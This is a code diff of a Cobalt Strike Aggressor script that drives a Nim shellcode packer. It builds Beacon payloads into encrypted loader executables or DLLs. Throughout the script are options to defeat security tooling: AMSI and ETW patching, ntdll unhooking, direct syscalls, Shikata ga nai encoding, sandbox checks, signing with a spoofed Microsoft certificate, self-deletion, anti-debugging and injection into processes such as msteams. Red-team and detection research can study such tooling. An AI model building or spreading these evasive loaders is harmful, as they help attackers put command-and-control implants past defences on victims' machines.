@@ -1,6 +1,28 @@
 sub compile {
-        %options = $3;
         $packers_folder = getFileParent(script_resource("NimSyscallLoader.cna"));
+        
+        chdir($packers_folder);
+
+        if (-exists script_resource("NimSyscallLoader.exe") || -exists script_resource("NimSyscallLoader")) {
+                # Write payload
+                $cradle = openf(">beacon.bin");
+                writeb($cradle, $data);
+                closef($cradle);
+
+                #show_message(@command)
+                exec(@command, $null, $packers_folder);
+                sleep(1000)
+                show_message("NimSyscallPacker launched... Generation of Loader will take a few seconds and will be found here: $packers_folder");
+        }
+        else {
+                show_message("Please compile NimSyscallPacker.nim and try again...");
+        }
+}
+
+sub set_params {
+        %options = $3;
+
+        @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin", "--shellcode");
 
         # Architecture
         if (%options["arch86"] eq "true") {
@@ -11,21 +33,28 @@ sub compile {
                 $data = artifact_payload(%options["listener"], "raw", "x64");
         }
 
-        chdir($packers_folder);
-
-        # Write payload
-        $cradle = openf(">beacon.bin");
-        writeb($cradle, $data);
-        closef($cradle);
-
-        @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin", "--shellcode");
-
         if (%options["key"] ne "") {
                 push(@command, "--key", %options["key"])
         }
 
-        if (%options["COMVARETW"] eq "true") {
-                push(@command, "--COMVARETW")
+        if (%options["output"] ne "Loader") {
+                push(@command, "--output", %options["output"])
+        }
+
+        if (%options["arguments"] ne "") {
+                push(@command, "--arguments", %options["arguments"])
+        }
+
+        if (%options["noRES"] eq "true") {
+                push(@command, "--noRES")
+        }
+
+        if (%options["dll"] eq "true") {
+                push(@command, "--dll")
+        }
+
+        if (%options["dllexportfunc"] ne "") {
+                push(@command, "--dllexportfunc", %options["dllexportfunc"])
         }
 
         if (%options["noETW"] eq "true") {
@@ -36,32 +65,36 @@ sub compile {
                 push(@command, "--noAMSI")
         }
 
-        if (%options["unhook"] eq "true") {
-                push(@command, "--unhook")
+        if (%options["noArgs"] eq "true") {
+                push(@command, "--noArgs")
+        }
+
+        if (%options["hide"] eq "true") {
+                push(@command, "--hide")
+        }
+
+        if (%options["APIhide"] eq "true") {
+                push(@command, "--APIhide")
         }
 
         if (%options["reflective"] eq "true") {
                 push(@command, "--reflective")
         }
 
-        if (%options["hellsgate"] eq "true") {
-                push(@command, "--hellsgate")
+        if (%options["debug"] eq "true") {
+                push(@command, "--debug")
         }
 
-        if (%options["syswhispers"] eq "true") {
-                push(@command, "--syswhispers")
+        if (%options["arch86"] eq "true") {
+                push(@command, "--x86")
         }
 
-        if (%options["jump"] eq "true") {
-                push(@command, "--jump")
+        if (%options["large"] eq "true") {
+                push(@command, "--large")
         }
-
-        if (%options["sgn"] eq "true") {
-                push(@command, "--sgn")
-        }
-
-        if (%options["hide"] eq "true") {
-                push(@command, "--hide")
+        
+        if (%options["noDInvoke"] eq "true") {
+                push(@command, "--noDInvoke")
         }
 
         if (%options["remoteinject"] eq "Newly spawned process (notepad)") {
@@ -84,8 +117,42 @@ sub compile {
                 }
         }
 
+        ev_menu()
+}
+
+sub set_ev_params {
+        %options = $3;
+        
         if (%options["sleep"] > 0) {
                 push(@command, "--sleep", %options["sleep"])
+        }
+
+        if (%options["hellsgate"] eq "true") {
+                push(@command, "--hellsgate")
+        }
+
+        if (%options["syswhispers"] eq "true") {
+                push(@command, "--syswhispers")
+        }
+
+        if (%options["jump"] eq "true") {
+                push(@command, "--jump")
+        }
+
+        if (%options["COMVARETW"] eq "true") {
+                push(@command, "--COMVARETW")
+        }
+
+        if (%options["unhook"] eq "true") {
+                push(@command, "--unhook")
+        }
+
+        if (%options["sgn"] eq "true") {
+                push(@command, "--sgn")
+        }
+
+        if (%options["replace"] eq "true") {
+                push(@command, "--replace")
         }
 
         if (%options["sandbox"] eq "Domain" && %options["domain"] ne "") {
@@ -104,86 +171,124 @@ sub compile {
                 push(@command, "--sandbox MemorySpace")
         }
 
-        if (%options["replace"] eq "true") {
-                push(@command, "--replace")
-        }
-
         if (%options["pump"] eq "words") {
                 push(@command, "--pump words")
         }
 
         if (%options["pump"] eq "reputation") {
                 push(@command, "--pump reputation")
-        }   
+        } 
 
+        if (%options["self-delete"] eq "true") {
+                push(@command, "--self-delete")
+        }
+        
         if (%options["obfuscatefunctions"] eq "true") {
                 push(@command, "--obfuscatefunctions")
         }
 
-        if (%options["dll"] eq "true") {
-                push(@command, "--dll")
+        if (%options["sign"] eq "true") {
+                push(@command, "--sign")
+                if (%options["signdomain"] ne "www.microsoft.com") {
+                        push(@command, "--signdomain", %options["signdomain"])
+                }
         }
 
-        if (%options["dllexportfunc"] ne "") {
-                push(@command, "--dllexportfunc", %options["dllexportfunc"])
+        if (%options["llvm"] eq "true") {
+                push(@command, "--llvm")
         }
 
-        if (%options["debug"] eq "true") {
-                push(@command, "--debug")
+        if (%options["sleepycrypt"] eq "true") {
+                push(@command, "--sleepycrypt")
         }
 
-        if (%options["arch86"] eq "true") {
-                push(@command, "--x86")
+        if (%options["fluctuate"] eq "true") {
+                push(@command, "--fluctuate")
         }
 
-        exec(@command, $null, $packers_folder);
-        sleep(3000)
-        show_message("NimSyscallPacker launched... Loader.exe can be found here: $packers_folder");
+        if (%options["antidebug"] eq "true") {
+                push(@command, "--antidebug")
+        }
+
+        compile()
+
 }
 
+sub ev_menu {
+        local('$dialog %defaults');
+        # setup our defaults
+        %defaults["sleep"] = 0;
+        %defaults["signdomain"] = "www.microsoft.com";
+        
+        $dialog_ev = dialog("NimSyscallPacker Evasion", %defaults, &set_ev_params);
+        drow_text($dialog_ev, "sleep", "Sleep before decryption: ");
+        drow_checkbox($dialog_ev, "hellsgate", "Hellsgate: ", "Retrieve Syscalls via Hellsgate technique");
+        drow_checkbox($dialog_ev, "syswhispers", "Syswhispers3: ", "Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique");
+        drow_checkbox($dialog_ev, "jump", "--- Jump: ", "When using Syswhispers3, use the jumper_randomized technique");
+        drow_checkbox($dialog_ev, "COMVARETW", "Block ETW: ", "Block ETW by setting COMPlus_ETWEnabled to 0");
+        drow_checkbox($dialog_ev, "unhook", "Unhook: ", "Unhook ntdll.dll before doing anything else for the current process");
+        drow_checkbox($dialog_ev, "obfuscate", "Obfuscate: ", "Compile via Denim to use LLVM obfuscation (not possible with --reflective)");
+        drow_checkbox($dialog_ev, "sgn", "Shikata ga nai: ", "Encode shellcode via SGN before encrypting it");
+        drow_checkbox($dialog_ev, "replace", "Replace: ", "Replace common nim IoC's in the loader like the string 'nim'");
+        drow_combobox($dialog_ev, "sandbox", "Sandbox Evasion: ", @(" -", "Domain", "DomainJoined (any domain)", "DiskSpace >= 200GB", "MemorySpace (more than 4GB RAM available)"));
+        drow_text($dialog_ev, "domain", "--- Sandbox Evasion Domain: ");
+        drow_combobox($dialog_ev, "pump", "Pump the file with: ", @(" -", "words", "reputation"));
+        drow_checkbox($dialog_ev, "self-delete", "Self-Delete: ", "Deletes own executable on runtime");
+        drow_checkbox($dialog_ev, "obfuscatefunctions", "Obfuscate functions: ", "Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator");
+        drow_checkbox($dialog_ev, "sign", "Sign: ", "Sign the binary with a spoofed certificate");
+        drow_text($dialog_ev, "signdomain", "--- Certificate domain: ");
+        drow_checkbox($dialog_ev, "llvm", "LLVM: ", "Add compiler flags for LLVM obfuscation");
+        drow_checkbox($dialog_ev, "sleepycrypt", "SleepyCrypt: ", "Encrypt the memory of the loader with SleepyCrypt - Pre-Alpha (not working yet for C2-Stager)");
+        drow_checkbox($dialog_ev, "fluctuate", "Fluctuate: ", "Enable ShellcodeFluctuation - Alpha (no support for remote injection)");
+        drow_checkbox($dialog_ev, "antidebug", "AntiDebug: ", "Checks the BeingDebugged flag of the current process and quits if set");
+
+        dbutton_action($dialog_ev, "Finish: Generate encrypted binary");
+        dialog_show($dialog_ev);
+}
+
+sub main_menu {
+        local('$dialog %defaults');
+        # setup our defaults
+        %defaults["key"] = "";
+        %defaults["output"] = "Loader";
+        %defaults["arguments"] = "";
+        %defaults["remoteprocess"] = "msteams";
+        %defaults["remotepatchAMSI"] = "true";
+        %defaults["remotepatchETW"] = "true";
+
+        # create our dialog
+        $dialog = dialog("NimSyscallPacker", %defaults, &set_params);
+        dialog_description($dialog, "Generate shellcode then encrypt it and pack it into a .exe binary using NimSyscallPacker. Select options below:");
+        drow_listener_stage($dialog, "listener", "Listener: ");
+        drow_text($dialog, "key", "Custom encryption key: ");
+        drow_text($dialog, "output", "Output Filename: ", "Filename for encrypted exe/dll");
+        drow_text($dialog, "arguments", "Hardcoded args to exe/dll: ", "Compile the following arguments to the encrypted exe/dll");
+        drow_checkbox($dialog, "noRES", "noRES: ", "Don't set custom resource file information (cmd icon, CMD description by default)");
+        drow_checkbox($dialog, "dll", "Generate a DLL: ", "Enabled");
+        drow_text($dialog, "dllexportfunc", "--- DLL custom export functions: ", "Define custom export functions for the generated DLL");                
+        drow_checkbox($dialog, "noETW", "No ETW: ", "Don't use ETW Patch");
+        drow_checkbox($dialog, "noAMSI", "No AMSI: ", "Don't patch AMSI");
+        drow_checkbox($dialog, "noArgs", "No Args: ", "Don't provide any arguments to the binary  (some can only run without args)");
+        drow_checkbox($dialog, "hide", "Hide: ", "Hide console using --app:gui flag,");
+        drow_checkbox($dialog, "APIhide", "APIhide: ", "Hide console using API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'");
+        drow_checkbox($dialog, "reflective", "Reflective: ", "Reflectively load the Nim binary");
+        drow_checkbox($dialog, "debug", "Debugging: ", "Enabled");
+        drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload");
+        drow_checkbox($dialog, "large", "Large Files: ", "Enable for large payloads (>5MB) - Solves too many interactions error");
+        drow_checkbox($dialog, "noDInvoke", "Don't use DInvoke: ", "Enable for older Windows OS Versions e.g. Windows Server 2012");
+        drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (notepad)", "Existing process"));
+        drow_text($dialog, "remoteprocess", "--- Remote target process: ", "Injects into the specified remote process name");
+        drow_checkbox($dialog, "remotepatchAMSI", "--- Remote AMSI: ", "Patch AMSI in the remote process before shellcode execution");
+        drow_checkbox($dialog, "remotepatchETW", "--- Remote ETW: ", "Patch ETW in the remote process before shellcode execution");
+
+        dbutton_action($dialog, "Next: Modify evasion settings");
+
+        # show our dialog
+        dialog_show($dialog);
+}
 
 popup attacks {
         item "NimSyscallPacker" {
-                local('$dialog %defaults');
-                # setup our defaults
-                %defaults["sleep"] = 0;
-                %defaults["key"] = "";
-                %defaults["remoteprocess"] = "msteams";
-                %defaults["remotepatchAMSI"] = "true";
-                %defaults["remotepatchETW"] = "true";
-
-                # create our dialog
-                $dialog = dialog("NimSyscallPacker", %defaults, &compile);
-                dialog_description($dialog, "Generate shellcode then encrypt it and pack it into a .exe binary using NimSyscallPacker. Select options below:");
-                drow_listener_stage($dialog, "listener", "Listener: ");
-                drow_text($dialog, "key", "Encryption key: ");
-                drow_checkbox($dialog, "COMVARETW", "Block ETW: ", "Block ETW by setting COMPlus_ETWEnabled to 0");
-                drow_checkbox($dialog, "noETW", "No ETW: ", "Don't use ETW Patch");
-                drow_checkbox($dialog, "noAMSI", "No AMSI: ", "Don't patch AMSI");
-                drow_checkbox($dialog, "unhook", "Unhook: ", "Unhook ntdll.dll before doing anything else for the current process");
-                drow_checkbox($dialog, "reflective", "Reflective: ", "Set compiler flags, so that the Loader Nim binary can be reflectively loaded");
-                drow_checkbox($dialog, "hellsgate", "Hellsgate: ", "Retrieve Syscalls via Hellsgate technique");
-                drow_checkbox($dialog, "syswhispers", "Syswhispers3: ", "Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique");
-                drow_checkbox($dialog, "jump", "--- Jump: ", "When using Syswhispers3, use the jumper_randomized technique");
-                drow_checkbox($dialog, "sgn", "Shikata ga nai: ", "Encode shellcode via SGN before encrypting it");
-                drow_checkbox($dialog, "hide", "Hide: ", "Compile with --app:gui flag, so that the console won't pop up");
-                drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (notepad)", "Existing process"));
-                drow_text($dialog, "remoteprocess", "--- Remote target process: ", "Injects into the specified remote process name");
-                drow_checkbox($dialog, "remotepatchAMSI", "--- Remote AMSI: ", "Patch AMSI in the remote process before shellcode execution");
-                drow_checkbox($dialog, "remotepatchETW", "--- Remote ETW: ", "Patch ETW in the remote process before shellcode execution");
-                drow_text($dialog, "sleep", "Sleep before decryption: ");
-                drow_combobox($dialog, "sandbox", "Sandbox Evasion: ", @(" -", "Domain", "DomainJoined (any domain)", "DiskSpace >= 200GB", "MemorySpace (more than 4GB RAM available)"));
-                drow_text($dialog, "domain", "--- Sandbox Evasion Domain: ");
-                drow_checkbox($dialog, "replace", "Replace: ", "Replace common nim IoC's in the loader like the string 'nim'");
-                drow_combobox($dialog, "pump", "Pump the file with: ", @(" -", "words", "reputation"));
-                drow_checkbox($dialog, "obfuscatefunctions", "Obfuscate functions: ", "Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator");
-                drow_checkbox($dialog, "dll", "Generate a DLL instead of an exe: ", "Enabled");
-                drow_text($dialog, "dllexportfunc", "DLL custom export functions: ", "Define custom export functions for the generated DLL");                
-                drow_checkbox($dialog, "debug", "Debugging: ", "Enabled");
-                drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload");
-                dbutton_action($dialog, "Generate encrypted binary");
-
-                # show our dialog
-                dialog_show($dialog);
+                main_menu()
         }
 }
